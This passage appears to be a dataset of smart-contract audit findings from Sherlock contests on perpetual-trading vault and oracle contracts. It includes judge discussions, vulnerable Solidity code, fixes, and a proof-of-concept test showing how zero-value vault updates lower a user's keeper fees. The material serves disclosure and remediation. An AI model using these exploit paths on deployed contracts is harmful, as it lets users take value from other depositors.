`increaseCollateralBalance` into account.). Much faster chains, like FTM, also exist in scope, where block times are much lower and the probability of a new block coming out in one second or less after the previous is nontrivial.\nThe bigger point is that, even if `increaseCollateralBalance` is not called, this bug completely bricks the HFT use case. If you look at the top perp protocols, a pretty high percentage of volume is just bots flipping around futures in short time frames. I don't think a use case that many institutional investors rely on and probably constitutes over 50% of volume on existing top perp protocols should be considered ""limited"".\nHere is Sherlock's criteria for High validity:\n`High: This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost). The attack path is possible with reasonable assumptions that mimic on-chain conditions. The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.`\n""This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost)"" -> There is indeed a material loss of funds.\n""The attack path is possible with reasonable assumptions that mimic on-chain conditions."" -> Yes, the HFT use case is pretty reasonable and common. The HFT use case is completely bricked and will lead to a material loss of funds. I also think that starting off with a lower amount of collateral, calling increase collateral balance (you don't want to be afraid of liquidation), and then attempting to close your position a few minutes later (e.g. if price moves against you and you change your mind), is a reasonable use case that will lead to a large material loss of funds.\n""The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team."" -> Sponsor has confirmed that this is not an acceptable risk.\nCzar102\nIt seems that the crux of the escalation argument is that this bug affects only a subset of use cases. I think the use cases affected are not ""theoretical"" enough not to deserve a high severity, they seem sensible. Even repaying in the same block should be allowed, for example could be used by a protocol utilizing this system that allows everyone to contribute.\nThe protocol team doesn't seem to have implemented considered `if` clause because of the formal correctness, rather real use cases.\nAlso, I don't follow this:\nFor 6 dp tokens:\n10^6 * 0.001 / 86400 = 1.1574 * 10^-2\nThis means that 6 dp positions over 86400 would not suffer from this unless closed in the same block.\nIt seems that the interest from an Ethereum block would be below 1 wei, certainly below `Constants.MINIMUM_AMOUNT`. But there is a good chance I am misunderstanding something.\n@IAm0x52 please let me know if my approach makes sense.\nIAm0x52\nMy argument stems from this set of judging rules which states that the issue is medium if it requires certain states/external conditions which it does. Also this isn't an attack. No one can repay or close your loan for you (besides liquidation which is irrelevant here). You would have to cause this loss for yourself.\nBy 86400 above I mean 86400 full 6 dp tokens i.e. 86400e6\nCzar102\nI am aware of Sherlock's rules. The conditionality in this issue is not of a state or external factors, but the use case of the protocol. In other words, this bug is not triggered if external conditions are met, or a specific state is achieved, which may be a reason to decrease severity to medium. As you said, triggering of this bug only depends on the use case of the protocol.\nBy executing actions that should normally work (and those actions have real, reasonable use cases), the user irreversibly loses funds which are locked in the contract forever.\nI am planning to reject the escalation and leave this a high severity issue.\nIAm0x52\nI see. This seems to be a much different interpretation of Sherlock's rule than has been previously used. My comments have been based on how I have seen this judged previously. We are all on the same page it seems from the technical side of if/when this issue happens. If @Evert0x agrees with this interpretation of the high risk criteria based on potentially reasonable use cases then there is nothing more to talk about here. If this is the case, I would also appreciate a change to judging rules to reflect this new line of logic.\nI personally don't see opening/adding collateral and closing in the exact same block as a common use case. I know HFT was mentioned above but since a single block is one specific point in time the only utility I see for that type of action would be arbitrage within the block. Given the large number of other more efficient ways to accomplish this it seems unlikely. Outside of single block closure the amount of time required between open and close to avoid this is a very short time (less than a minute for all but the smallest 6 dp token positions) I also find it highly unlikely that this will occur often at all.\ndetectiveking123\n""Also this isn't an attack. No one can repay or close your loan for you (besides liquidation which is irrelevant here). You would have to cause this loss for yourself.""\nHistorically many issues that aren't an attack, but cause a loss of funds, have been classified as high.\nhttps://github.com/sherlock-audit/2023-08-cooler-judging/issues/119 is one such example\nCzar102\nDiscussed this issue with @Evert0x. The high severity was designed to distinguish issues that would very likely cause protocol failure if in production. This bug is triggered only in scenarios that are somewhat extreme (execution in the same block, e.g. after gas price normalizes while the frontend allows that, some very specific protocol integrations, etc.)\nThe use cases presented are potentially reasonable, but very specific. Decided to consider this a medium severity issue. Escalation will be accepted and severity will be changed to medium.\ndetectiveking123\nIt's not exactly execution in the same block though -- you can execute multiple blocks later and still lose a decent amount of money (e.g. thousands at stake 10 blocks later). HFT is also a use case that will constitute a large amount, if not majority, of the volume on the platform.\nWill respect the outcome though, it is probably a borderline case.\nCzar102\n@detectiveking123 could you work out an example of a large loss in the longest timeframe possible? (most likely show payoff parameters for a worst case scenario)\nEvert0x\n@detectiveking123 will accept escalation and make Medium in 24 hours unless requested argument is provided.\nHHK-ETH\n@detectiveking123 could you work out an example of a large loss in the longest timeframe possible? (most likely show payoff parameters for a worst case scenario)\nBecause `MINIMUM_AMOUNT` doesn't scale with the token's decimals like I mentionned in this issue, if you were to use a token with even lower decimals than 1e6 you could end up with a much longer time frame.\nIf you want to long GUSD (2 decimals) against USDC (360k+ TVL on Uniswap v3), you can open a position with 5k GUSD with 0.1% fee and close it a day later and still be under `MINIMUM_AMOUNT` thus loosing your collateral balance.\n5k GUSD -> 500000 wei `MINIMUM_AMOUNT` -> 1000\n500000 * 0.1 / 100 = 500 < `MINIMUM_AMOUNT`\nAmount lost will be very small most of the time as it will be the collateral for a day so between 0.05% and 1% according to current protocol's parameters.\nException is if the user called `increaseCollateralBalance()` before changing his mind and closing the position in which case it can be way higher. An example using the case above is a user betting on a USDC depeg and so open a position to short it and long GUSD and put collateral for a few days by calling `increaseCollateralBalance()`, then a news comes in that makes the depeg unlikely anymore and so our user close his positions but looses his whole collateral.\nSo I guess the question is how likely is this kind of scenario to know if it falls in ""Causes a loss of funds but requires certain external conditions or specific states"".\nCzar102\nAmount lost will be very small most of the time as it will be the collateral for a day so between 0.05% and 1% according to current protocol's parameters.\nFrom my understanding, it was a loss of the whole collateral. So in the above case, it's $5k. Can you confirm @HHK-ETH @detectiveking123?\nHHK-ETH\nAmount lost will be very small most of the time as it will be the collateral for a day so between 0.05% and 1% according to current protocol's parameters.\nFrom my understanding, it was a loss of the whole collateral. So in the above case, it's $5k. Can you confirm @HHK-ETH @detectiveking123?\nYes it's a loss of the whole collateral but no collateral is only a percentage of the borrowing position since you don't control the tokens borrowed this protocol doesn't need you to have an overcollaterized position.\nHHK-ETH\nUpdated the calculation in https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/122#issuecomment-1807427259 as I made an error yesterday. New example is a day long.\nEvert0x\nBased on my interpretation this is a clear case for Medium severity. But if I understand correctly, you are advocating for high severity with your comment? @HHK-ETH\nLoss is between 0.05% and 1%\nRequires 2 decimal tokens (GUSD)\nUser needs to call `increaseCollateralBalance()` before to increase the loss %\nSo I guess the question is how likely is this kind of scenario to know if it falls in ""Causes a loss of funds but requires certain external conditions or specific states"".\nYou are also quoting the ""How to identify a medium issue"" here, so I'm kind of confused what your comment is intending to clarify. As medium was agreed upon earlier.\nHHK-ETH\nI was mostly trying to give extra examples that could help judges define the severity.\nAlthough I have a duplicate of this finding and would benefit from it accepted as high, it seems that it fits better as a medium severity indeed.\nEvert0x\nResult: Medium Has Duplicates\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nIAm0x52: accepted"чUser's collateral will be stuck in Vault when it should be sent back to them. This could be a large amount of funds if for example `increaseCollateralBalance` is called first.\nCode Snippet\nTool used\nManual Review
commitRequested() front-run malicious invalid oralceчmediumч"```\n    function commitRequested(uint256 versionIndex, bytes calldata updateData)\n        public\n        payable\n        keep(KEEPER_REWARD_PREMIUM, KEEPER_BUFFER, updateData, """")\n    {\n// rest of code\n\n      if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n        lastCommittedPublishTime = pythPrice.publishTime;\n// rest of code\n```\n"ч"Execution of the `commitRequested()` method restricts the `lastCommittedPublishTime` from going backward.\n```\n    function commitRequested(uint256 versionIndex, bytes calldata updateData)\n        public\n        payable\n        keep(KEEPER_REWARD_PREMIUM, KEEPER_BUFFER, updateData, """")\n    {\n// rest of code\n\n      if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n        lastCommittedPublishTime = pythPrice.publishTime;\n// rest of code\n```\n\n`commit()` has a similar limitation and can set `lastCommittedPublishTime`.\n```\n    function commit(uint256 versionIndex, uint256 oracleVersion, bytes calldata updateData) external payable {\n        if (\n            versionList.length > versionIndex &&                // must be a requested version\n            versionIndex >= nextVersionIndexToCommit &&         // must be the next (or later) requested version\n          oracleVersion == versionList[versionIndex]          // must be the corresponding timestamp\n        ) {\n            commitRequested(versionIndex, updateData);\n            return;\n        }\n// rest of code\n      if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n      lastCommittedPublishTime = pythPrice.publishTime;\n// rest of code.\n```\n\nThis leads to a situation where anyone can front-run `commitRequested()` and use his `updateData` to execute `commit()`. In order to satisfy the `commit()` constraint, we need to pass a `commit()` parameter set as follows\nversionIndex= nextVersionIndexToCommit\noracleVersion = versionList[versionIndex] - 1 and oralceVersion > _latestVersion\npythPrice.publishTime >= versionList[versionIndex] - 1 + MIN_VALID_TIME_AFTER_VERSION\nThis way `lastCommittedPublishTime` will be modified, causing `commitRequested()` to execute with `revert PythOracleNonIncreasingPublishTimes`\nExample: Given: nextVersionIndexToCommit = 10 versionList[10] = 200\n_latestVersion = 100\nwhen:\nkeeper exexute commitRequested(versionIndex = 10 , VAA{ publishTime = 205})\nfront-run execute `commit(versionIndex = 10 , oracleVersion = 200-1 , VAA{ publishTime = 205})\nversionIndex= nextVersionIndexToCommit （pass）\noracleVersion = versionList[versionIndex] - 1 and oralceVersion > _latestVersion (pass)\npythPrice.publishTime >= versionList[versionIndex] - 1 + MIN_VALID_TIME_AFTER_VERSION (pass)\nBy the time the `keeper` submits the next VVA, the price may have passed its expiration date"чcheck `pythPrice` whether valid for `nextVersionIndexToCommit`\n```\n    function commit(uint256 versionIndex, uint256 oracleVersion, bytes calldata updateData) external payable {\n        // Must be before the next requested version to commit, if it exists\n        // Otherwise, try to commit it as the next request version to commit\n        if (\n            versionList.length > versionIndex &&                // must be a requested version\n            versionIndex >= nextVersionIndexToCommit &&         // must be the next (or later) requested version\n            oracleVersion == versionList[versionIndex]          // must be the corresponding timestamp\n        ) {\n            commitRequested(versionIndex, updateData);\n            return;\n        }\n\n        PythStructs.Price memory pythPrice = _validateAndGetPrice(oracleVersion, updateData);\n\n        // Price must be more recent than that of the most recently committed version\n        if (pythPrice.publishTime <= lastCommittedPublishTime) revert PythOracleNonIncreasingPublishTimes();\n        lastCommittedPublishTime = pythPrice.publishTime;\n\n        // Oracle version must be more recent than that of the most recently committed version\n        uint256 minVersion = _latestVersion;\n        uint256 maxVersion = versionList.length > versionIndex ? versionList[versionIndex] : current();\n\n        if (versionIndex < nextVersionIndexToCommit) revert PythOracleVersionIndexTooLowError();\n        if (versionIndex > nextVersionIndexToCommit && block.timestamp <= versionList[versionIndex - 1] // Add the line below\n GRACE_PERIOD)\n            revert PythOracleGracePeriodHasNotExpiredError();\n        if (oracleVersion <= minVersion || oracleVersion >= maxVersion) revert PythOracleVersionOutsideRangeError();\n// Add the line below\n       if (nextVersionIndexToCommit < versionList.length) {\n// Add the line below\n           if (\n// Add the line below\n               pythPrice.publishTime >= versionList[nextVersionIndexToCommit] // Add the line below\n MIN_VALID_TIME_AFTER_VERSION &&\n// Add the line below\n               pythPrice.publishTime <= versionList[nextVersionIndexToCommit] // Add the line below\n MAX_VALID_TIME_AFTER_VERSION\n// Add the line below\n           ) revert PythOracleUpdateValidForPreviousVersionError();\n// Add the line below\n       }\n\n\n        _recordPrice(oracleVersion, pythPrice);\n        nextVersionIndexToCommit = versionIndex;\n        _latestVersion = oracleVersion;\n    }\n```\n\nDiscussion\nsherlock-admin\n4 comment(s) were left on this issue during the judging contest.\npanprog commented:\nborderline low/medium. The issue is valid and can force keepers to re-submit if they're frontrun. It's still always possible to submit a price with publishTime which is at MAX_VALID_TIME_AFTER_VERSION away from version time, but this still interfere oracle keepers process and increases chances of invalid version. Definitely not high, because it doesn't break things, just forces to re-submit transactions and keepers can also front-run each other, so reverted keep transactions are not something possible only due to this issue. Probably a better fix is to commitRequested instead of just commit if publishTime is between MIN and MAX valid time.\nn33k commented:\ninvalid, expected behavior for commitRequested to revert because commit alreay provided the oracleVersion\n0xyPhilic commented:\ninvalid because there is no proof of funds loss\npolarzero commented:\nMedium. Not sure what the incentive would be for an attacker to do this, and the impact it would have, but I'd rather have it downgraded than ignored.чIf the user can control the oralce invalidation, it can lead to many problems e.g. invalidating `oracle` to one's own detriment, not having to take losses Maliciously destroying other people's profits, etc.\nCode Snippet\nTool used\nManual Review
`Vault.update(anyUser,0,0,0)` can be called for free to increase `checkpoint.count` and pay smaller keeper fee than necessaryчmediumч```\n// invariant\n// @audit operator - pass\nif (msg.sender != account && !IVaultFactory(address(factory())).operators(account, msg.sender))\n    revert VaultNotOperatorError();\n// @audit 0,0,0 is single-sided - pass\nif (!depositAssets.add(redeemShares).add(claimAssets).eq(depositAssets.max(redeemShares).max(claimAssets)))\n    revert VaultNotSingleSidedError();\n// @audit depositAssets == 0 - pass\nif (depositAssets.gt(_maxDeposit(context)))\n    revert VaultDepositLimitExceededError();\n// @audit redeemShares == 0 - pass\nif (redeemShares.gt(_maxRedeem(context)))\n    revert VaultRedemptionLimitExceededError();\n// @audit depositAssets == 0 - pass\nif (!depositAssets.isZero() && depositAssets.lt(context.settlementFee))\n    revert VaultInsufficientMinimumError();\n// @audit redeemShares == 0 - pass\nif (!redeemShares.isZero() && context.latestCheckpoint.toAssets(redeemShares, context.settlementFee).isZero())\n    revert VaultInsufficientMinimumError();\n// @audit since this will be called by **different** users in the same epoch, this will also pass\nif (context.local.current != context.local.latest) revert VaultExistingOrderError();\n```\nч"`Vault._update(user, 0, 0, 0)` will pass all invariants checks:\n```\n// invariant\n// @audit operator - pass\nif (msg.sender != account && !IVaultFactory(address(factory())).operators(account, msg.sender))\n    revert VaultNotOperatorError();\n// @audit 0,0,0 is single-sided - pass\nif (!depositAssets.add(redeemShares).add(claimAssets).eq(depositAssets.max(redeemShares).max(claimAssets)))\n    revert VaultNotSingleSidedError();\n// @audit depositAssets == 0 - pass\nif (depositAssets.gt(_maxDeposit(context)))\n    revert VaultDepositLimitExceededError();\n// @audit redeemShares == 0 - pass\nif (redeemShares.gt(_maxRedeem(context)))\n    revert VaultRedemptionLimitExceededError();\n// @audit depositAssets == 0 - pass\nif (!depositAssets.isZero() && depositAssets.lt(context.settlementFee))\n    revert VaultInsufficientMinimumError();\n// @audit redeemShares == 0 - pass\nif (!redeemShares.isZero() && context.latestCheckpoint.toAssets(redeemShares, context.settlementFee).isZero())\n    revert VaultInsufficientMinimumError();\n// @audit since this will be called by **different** users in the same epoch, this will also pass\nif (context.local.current != context.local.latest) revert VaultExistingOrderError();\n```\n\nIt then calculates amount to claim by calling _socialize:\n```\n// asses socialization and settlement fee\nUFixed6 claimAmount = _socialize(context, depositAssets, redeemShares, claimAssets);\n// rest of code\nfunction _socialize(\n    Context memory context,\n    UFixed6 depositAssets,\n    UFixed6 redeemShares,\n    UFixed6 claimAssets\n) private view returns (UFixed6 claimAmount) {\n    // @audit global assets must be 0 to make (0,0,0) pass this function\n    if (context.global.assets.isZero()) return UFixed6Lib.ZERO;\n    UFixed6 totalCollateral = UFixed6Lib.from(_collateral(context).max(Fixed6Lib.ZERO));\n    claimAmount = claimAssets.muldiv(totalCollateral.min(context.global.assets), context.global.assets);\n\n    // @audit for (0,0,0) this will revert (underflow)\n    if (depositAssets.isZero() && redeemShares.isZero()) claimAmount = claimAmount.sub(context.settlementFee);\n}\n```\n\n`_socialize` will immediately return 0 if `context.global.assets == 0`. If `context.global.assets > 0`, then this function will revert in the last line due to underflow (trying to subtract `settlementFee` from 0 claimAmount)\nThis is the condition for this issue to happen: global assets must be 0. Global assets are the amounts redeemed but not yet claimed by users. So this can reasonably happen in the first days of the vault life, when users mostly only deposit, or claim everything they withdraw.\nOnce this function passes, the following lines increase checkpoint.count:\n```\n// update positions\ncontext.global.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.local.update(context.currentId, claimAssets, redeemShares, depositAssets, redeemShares);\ncontext.currentCheckpoint.update(depositAssets, redeemShares);\n// rest of code\n// Checkpoint library:\n// rest of code\nfunction update(Checkpoint memory self, UFixed6 deposit, UFixed6 redemption) internal pure {\n    (self.deposit, self.redemption) = (self.deposit.add(deposit), self.redemption.add(redemption));\n    self.count++;\n}\n```\n\nThe rest of the function executes normally.\nDuring position settlement, pending user deposits and redeems are reduced by the keeper fees / checkpoint.count:\n```\n// Account library:\n// rest of code\nfunction processLocal(\n    Account memory self,\n    uint256 latestId,\n    Checkpoint memory checkpoint,\n    UFixed6 deposit,\n    UFixed6 redemption\n) internal pure {\n    self.latest = latestId;\n    (self.assets, self.shares) = (\n        self.assets.add(checkpoint.toAssetsLocal(redemption)),\n        self.shares.add(checkpoint.toSharesLocal(deposit))\n    );\n    (self.deposit, self.redemption) = (self.deposit.sub(deposit), self.redemption.sub(redemption));\n}\n// rest of code\n// Checkpoint library\n// toAssetsLocal / toSharesLocal calls _withoutKeeperLocal to calculate keeper fees:\n// rest of code\n    function _withoutKeeperLocal(Checkpoint memory self, UFixed6 amount) private pure returns (UFixed6) {\n        UFixed6 keeperPer = self.count == 0 ? UFixed6Lib.ZERO : self.keeper.div(UFixed6Lib.from(self.count));\n        return _withoutKeeper(amount, keeperPer);\n    }\n```\n\nAlso notice that in `processLocal` the only thing which keeper fees influence are deposits and redemptions, but not claims.\nThe scenario above is demonstrated in the test, add this to Vault.test.ts:\n```\nit('inflate checkpoint count', async () => {\n    const settlementFee = parse6decimal('10.00')\n    const marketParameter = { // rest of code(await market.parameter()) }\n    marketParameter.settlementFee = settlementFee\n    await market.connect(owner).updateParameter(marketParameter)\n    const btcMarketParameter = { // rest of code(await btcMarket.parameter()) }\n    btcMarketParameter.settlementFee = settlementFee\n    await btcMarket.connect(owner).updateParameter(btcMarketParameter)\n\n    const deposit = parse6decimal('10000')\n    await vault.connect(user).update(user.address, deposit, 0, 0)\n    await updateOracle()\n    await vault.settle(user.address)\n\n    const deposit2 = parse6decimal('10000')\n    await vault.connect(user2).update(user2.address, deposit2, 0, 0)\n\n    // inflate checkpoint.count\n    await vault.connect(btcUser1).update(btcUser1.address, 0, 0, 0)\n    await vault.connect(btcUser2).update(btcUser2.address, 0, 0, 0)\n\n    await updateOracle()\n    await vault.connect(user2).settle(user2.address)\n\n    const checkpoint2 = await vault.checkpoints(3)\n    console.log(""checkpoint count = "" + checkpoint2.count)\n\n    var account = await vault.accounts(user.address);\n    var assets = await vault.convertToAssets(account.shares);\n    console.log(""User shares:"" + account.shares + "" assets: "" + assets);\n    var account = await vault.accounts(user2.address);\n    var assets = await vault.convertToAssets(account.shares);\n    console.log(""User2 shares:"" + account.shares + "" assets: "" + assets);\n})\n```\n\nConsole output:\n```\ncheckpoint count = 3\nUser shares:10000000000 assets: 9990218973\nUser2 shares:10013140463 assets: 10003346584\n```\n\nSo the user2 inflates his deposited amounts by paying smaller keeper fee.\nIf 2 lines which inflate checkpoint count (after corresponding comment) are deleted, then the output is:\n```\ncheckpoint count = 1\nUser shares:10000000000 assets: 9990218973\nUser2 shares:9999780702 assets: 9989999890\n```\n\nSo if not inflated, user2 pays correct amount and has roughly the same assets as user1 after his deposit."чConsider reverting (0,0,0) vault updates, or maybe redirecting to `settle` in this case. Additionally, consider updating checkpoint only if `depositAssets` or `redeemShares` are not zero:\n```\nif (!depositAssets.isZero() || !redeemShares.isZero())\n    context.currentCheckpoint.update(depositAssets, redeemShares);\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\npolarzero commented:\nMedium. Perfectly explained and demonstrated in the report.\nkbrizzle\nFixed in: https://github.com/equilibria-xyz/perennial-v2/pull/111.\npanprog\n`Vault(user,0,0,0)` increasing `checkpoint.count` (medium severity) - fixed\nAny user who is claiming still increases `checkpoint.count`, although he pays for the claim fully and doesn't participate in paying the keeper fee for deposit/redeem, thus he shouldn't increase `checkpoint.count` (low severity) - not fixed\nkbrizzle\nSince (2) is overcharging the fee instead of undercharging (claim pays entire settlement fee instead of splitting the resulting fee with others in version), we're going to leave this as-is. We'll make a note of this in case we improve the claiming flow in the future.\njacksanford1\nBased on @kbrizzle's comment, Sherlock will consider the issue brought up in #2 in the comment above by panprog as acknowledged.чMalicious vault user can inflate `checkpoint.count` to pay much smaller keeper fee than they should at the expense of the other vault users.\nCode Snippet\nTool used\nManual Review
MultiInvoker liquidation action will revert most of the time due to incorrect closable amount initializationчmediumч```\nfunction _latest(\n    IMarket market,\n    address account\n) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n    // load parameters from the market\n    IPayoffProvider payoff = market.payoff();\n\n    // load latest settled position and price\n    uint256 latestTimestamp = market.oracle().latest().timestamp;\n    latestPosition = market.positions(account);\n    latestPrice = market.global().latestPrice;\n    UFixed6 previousMagnitude = latestPosition.magnitude();\n\n    // @audit-issue Should add:\n    // closableAmount = previousMagnitude;\n    // otherwise if no position is settled in the following loop, closableAmount incorrectly remains 0\n\n    // scan pending position for any ready-to-be-settled positions\n    Local memory local = market.locals(account);\n    for (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n\n        // load pending position\n        Position memory pendingPosition = market.pendingPositions(account, id);\n        pendingPosition.adjust(latestPosition);\n\n        // load oracle version for that position\n        OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n        if (address(payoff) != address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n        // virtual settlement\n        if (pendingPosition.timestamp <= latestTimestamp) {\n            if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n            latestPosition.update(pendingPosition);\n            if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n            previousMagnitude = latestPosition.magnitude();\n@@@         closableAmount = previousMagnitude;\n\n        // process pending positions\n        } else {\n            closableAmount = closableAmount\n                .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n            previousMagnitude = latestPosition.magnitude();\n        }\n    }\n}\n```\nч`MultiInvoker` calculates the `closable` amount in its `_latest` function incorrectly. In particular, it doesn't initialize `closableAmount`, so it's set to 0 initially. It then scans pending positions, settling those which should be settled, and reducing `closableAmount` if necessary for remaining pending positions:\n```\nfunction _latest(\n    IMarket market,\n    address account\n) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n    // load parameters from the market\n    IPayoffProvider payoff = market.payoff();\n\n    // load latest settled position and price\n    uint256 latestTimestamp = market.oracle().latest().timestamp;\n    latestPosition = market.positions(account);\n    latestPrice = market.global().latestPrice;\n    UFixed6 previousMagnitude = latestPosition.magnitude();\n\n    // @audit-issue Should add:\n    // closableAmount = previousMagnitude;\n    // otherwise if no position is settled in the following loop, closableAmount incorrectly remains 0\n\n    // scan pending position for any ready-to-be-settled positions\n    Local memory local = market.locals(account);\n    for (uint256 id = local.latestId + 1; id <= local.currentId; id++) {\n\n        // load pending position\n        Position memory pendingPosition = market.pendingPositions(account, id);\n        pendingPosition.adjust(latestPosition);\n\n        // load oracle version for that position\n        OracleVersion memory oracleVersion = market.oracle().at(pendingPosition.timestamp);\n        if (address(payoff) != address(0)) oracleVersion.price = payoff.payoff(oracleVersion.price);\n\n        // virtual settlement\n        if (pendingPosition.timestamp <= latestTimestamp) {\n            if (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\n            latestPosition.update(pendingPosition);\n            if (oracleVersion.valid) latestPrice = oracleVersion.price;\n\n            previousMagnitude = latestPosition.magnitude();\n@@@         closableAmount = previousMagnitude;\n\n        // process pending positions\n        } else {\n            closableAmount = closableAmount\n                .sub(previousMagnitude.sub(pendingPosition.magnitude().min(previousMagnitude)));\n            previousMagnitude = latestPosition.magnitude();\n        }\n    }\n}\n```\n\nNotice, that `closableAmount` is initialized to `previousMagnitude` only if there is at least one position that needs to be settled. However, if `local.latestId == local.currentId` (which is the case for most of the liquidations - position becomes liquidatable due to price changes without any pending positions created by the user), this loop is skipped entirely, never setting `closableAmount`, so it's incorrectly returned as 0, although it's not 0 (it should be the latest settled position magnitude).\nSince `LIQUIDATE` action of `MultiInvoker` uses `_latest` to calculate `closableAmount` and `liquidationFee`, these values will be calculated incorrectly and will revert when trying to update the market. See the `_liquidate` market update reducing `currentPosition` by `closable` (which is 0 when it must be bigger):\n```\nmarket.update(\n    account,\n    currentPosition.maker.isZero() ? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero() ? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero() ? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n);\n```\n\nThis line will revert because `Market._invariant` verifies that `closableAmount` must be 0 after updating liquidated position:\n```\nif (protected && (\n@@@ !closableAmount.isZero() ||\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        collateralAfterFees.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n```\nч"Initialize `closableAmount` to previousMagnitude:\n```\n    function _latest(\n        IMarket market,\n        address account\n    ) internal view returns (Position memory latestPosition, Fixed6 latestPrice, UFixed6 closableAmount) {\n        // load parameters from the market\n        IPayoffProvider payoff = market.payoff();\n\n        // load latest settled position and price\n        uint256 latestTimestamp = market.oracle().latest().timestamp;\n        latestPosition = market.positions(account);\n        latestPrice = market.global().latestPrice;\n        UFixed6 previousMagnitude = latestPosition.magnitude();\n+       closableAmount = previousMagnitude;\n```\n\nDiscussion\nsherlock-admin\n1 comment(s) were left on this issue during the judging contest.\npolarzero commented:\nHigh. This would both cause a loss of funds and a malfunction in the protocol.\nkbrizzle\nSince standalone `settle` was dropped in v2, I believe it's actually impossible for a local account to have no pending positions once initialized, since a new pending position is always created at `current` when settling `latest` and `current` != `latest`.\nNonetheless we've fixed this here to remain consistent with the implementation in `Market`, which provides better safety in case we ever decide to bring back a standalone `settle` functionality in future versions.\npanprog\nSince standalone `settle` was dropped in v2, I believe it's actually impossible for a local account to have no pending positions once initialized, since a new pending position is always created at `current` when settling `latest` and `current` != `latest`.\nAgree, didn't think about it but indeed it's not possible to make them equal. Still, it can happen as described in point 2 in the report: if liquidator commits oracle unrequested (so the latest is before the first position settlement of the account), then the loop will never enter the ""virtual settlement"" part and `closableAmount` will remain 0.\nSince it can still happen but only in certain edge case, this should be downgraded to medium.\npanprog\nFixed"чAll `MultiInvoker` liquidation actions will revert if trying to liquidate users without positions which can be settled, which can happen in 2 cases:\nLiquidated user doesn't have any pending positions at all (local.latestId == local.currentId). This is the most common case (price has changed and user is liquidated without doing any actions) and we can reasonably expect that this will be the case for at least 50% of liquidations (probably more, like 80-90%).\nLiquidated user does have pending positions, but no pending position is ready to be settled yet. For example, if liquidator commits unrequested oracle version which liquidates user, even if the user already has pending position (but which is not yet ready to be settled).\nSince this breaks important `MultiInvoker` functionality in most cases and causes loss of funds to liquidator (revert instead of getting liquidation fee), I believe this should be High severity.\nCode Snippet\nTool used\nManual Review
MultiInvoker liquidation action will revert due to incorrect closable amount calculation for invalid oracle versionsчmediumч```\nif (!version.valid) context.latestPosition.local.invalidate(newPosition);\nnewPosition.adjust(context.latestPosition.local);\n// rest of code\ncontext.latestPosition.local.update(newPosition);\n```\nч`MultiInvoker` calculates the `closable` amount in its `_latest` function. This function basically repeats the logic of `Market._settle`, but fails to repeat it correctly for the invalid oracle version settlement. When invalid oracle version is settled, `latestPosition` invalidation should increment, but the `latestPosition` should remain the same. This is achieved in the `Market._processPositionLocal` by adjusting `newPosition` after invalidation before the `latestPosition` is set to newPosition:\n```\nif (!version.valid) context.latestPosition.local.invalidate(newPosition);\nnewPosition.adjust(context.latestPosition.local);\n// rest of code\ncontext.latestPosition.local.update(newPosition);\n```\n\nHowever, `MultiInvoker` doesn't adjust the new position and simply sets `latestPosition` to new position both when oracle is valid or invalid:\n```\nif (!oracleVersion.valid) latestPosition.invalidate(pendingPosition);\nlatestPosition.update(pendingPosition);\n```\n\nThis leads to incorrect value of `closableAmount` afterwards:\n```\npreviousMagnitude = latestPosition.magnitude();\nclosableAmount = previousMagnitude;\n```\n\nFor example, if `latestPosition.market = 10`, `pendingPosition.market = 0` and pendingPosition has invalid oracle, then:\n`Market` will invalidate (latestPosition.invalidation.market = 10), adjust (pendingPosition.market = 10), set `latestPosition` to new `pendingPosition` (latestPosition.maker = pendingPosition.maker = 10), so `latestPosition.maker` correctly remains 10.\n`MultiInvoker` will invalidate (latestPosition.invalidation.market = 10), and immediately set `latestPosition` to `pendingPosition` (latestPosition.maker = pendingPosition.maker = 0), so `latestPosition.maker` is set to 0 incorrectly.\nSince `LIQUIDATE` action of `MultiInvoker` uses `_latest` to calculate `closableAmount` and `liquidationFee`, these values will be calculated incorrectly and will revert when trying to update the market. See the `_liquidate` market update reducing `currentPosition` by `closable` (which is 0 when it must be bigger):\n```\nmarket.update(\n    account,\n    currentPosition.maker.isZero() ? UFixed6Lib.ZERO : currentPosition.maker.sub(closable),\n    currentPosition.long.isZero() ? UFixed6Lib.ZERO : currentPosition.long.sub(closable),\n    currentPosition.short.isZero() ? UFixed6Lib.ZERO : currentPosition.short.sub(closable),\n    Fixed6Lib.from(-1, liquidationFee),\n    true\n);\n```\n\nThis line will revert because `Market._invariant` verifies that `closableAmount` must be 0 after updating liquidated position:\n```\nif (protected && (\n@@@ !closableAmount.isZero() ||\n    context.latestPosition.local.maintained(\n        context.latestVersion,\n        context.riskParameter,\n        collateralAfterFees.sub(collateral)\n    ) ||\n    collateral.lt(Fixed6Lib.from(-1, _liquidationFee(context, newOrder)))\n)) revert MarketInvalidProtectionError();\n```\nчBoth `Market` and `MultiInvoker` handle position settlement for invalid oracle versions 